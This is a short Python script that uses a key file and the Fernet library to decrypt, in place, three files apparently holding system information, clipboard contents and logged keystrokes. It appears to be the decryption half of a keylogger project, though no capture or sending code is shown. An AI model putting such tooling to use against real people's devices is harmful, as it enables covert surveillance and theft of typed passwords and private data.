from cryptography.fernet import Fernet

system_information_e = "e_system.txt"
clipboard_information_e = "e_clipboard.txt"
keys_information_e = "e_keys_logged.txt"
key_file = open("encryption_key.txt")
key = key_file.read()
key_file.close()

encrypted_files = [system_information_e, clipboard_information_e, keys_information_e]

for file in encrypted_files:
    with open(file,'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    decrypted = fernet.decrypt(data)

    with open(file,'wb') as f:
        f.write(decrypted)